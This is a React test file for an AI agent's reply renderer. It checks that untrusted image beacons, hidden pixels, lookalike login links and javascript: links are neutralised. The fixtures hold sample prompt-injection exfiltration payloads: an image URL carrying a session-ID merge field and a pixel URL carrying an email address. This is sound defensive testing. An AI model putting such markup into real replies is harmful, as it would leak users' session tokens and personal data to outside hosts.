/** RJ-02 · AgentReply · A-201, A-216, A-313, A-204 */
import { render } from '@testing-library/react';
import { AgentReply } from '../AgentReply';
import { TRUSTED_HOSTS } from '../../allowlist';
import { activeMarkup, untrusted } from './helpers';

const host = (u: string | null) => {
  try {
    return new URL(u ?? '').hostname;
  } catch {
    return null;
  }
};

const REPLIES: [string, string][] = [
  ['A-201 image beacon', `Summary. ${untrusted('A-201').match(/!\[[^\]]*\]\([^)]*\)/)![0]} Demo Contact 555-0100`],
  ['A-216 session badge', 'On track. ![ok](https://status.demo.example/b.png?s={!$Api.Session_ID})'],
  ['A-313 hidden pixel', 'Done. ![ ](https://img.demo.example/p.gif?d=demo.contact@demo.example)'],
  ['A-204 lookalike login', `Try ${untrusted('A-204').match(/\[[^\]]+\]\([^)]*\)/)![0]}`],
  ['script-scheme link', `Open [logs](${['javascript', 'window.__calhackMarker=1'].join(':')})`],
];

describe('RJ-02 AgentReply', () => {
  it.each(REPLIES)('%s: no outside image loads and links show their real host', (_label, reply) => {
    const { container } = render(<AgentReply reply={reply} />);
    container.querySelectorAll('img').forEach(img => expect(TRUSTED_HOSTS).toContain(host(img.getAttribute('src'))));
    container.querySelectorAll('a').forEach(a => {
      const h = host(a.getAttribute('href'));
      expect(TRUSTED_HOSTS).toContain(h);
      expect(a.parentElement!.textContent).toContain(h!);
    });
    expect(activeMarkup(container)).toEqual([]);
  });

  it('shows merge-field syntax as literal text', () => {
    const { container } = render(<AgentReply reply="Your session: {!$Api.Session_ID}" />);
    expect(container.textContent).toContain('{!$Api.Session_ID}');
  });

  it('keeps trusted images and links (no over-blocking)', () => {
    const { container } = render(<AgentReply reply="![l](https://docs.calhk-demo.example/l.png) [d](https://docs.calhk-demo.example/h)" />);
    expect(container.querySelectorAll('img').length).toBe(1);
    expect(container.querySelectorAll('a').length).toBe(1);
  });
});
